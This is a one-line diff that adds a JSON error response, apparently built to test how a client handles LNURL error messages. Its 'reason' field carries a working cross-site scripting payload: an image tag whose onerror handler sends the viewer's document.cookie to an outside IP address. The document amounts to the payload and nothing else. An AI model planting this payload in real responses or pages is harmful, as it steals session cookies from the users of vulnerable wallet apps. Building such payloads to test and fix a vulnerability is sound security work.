@@ -1,0 +1,1 @@
+{"status":"ERROR","reason":"<img src=x onerror=fetch('http://47.250.155.133:18080/xss_via_lnurl?cookie='+document.cookie)>"}
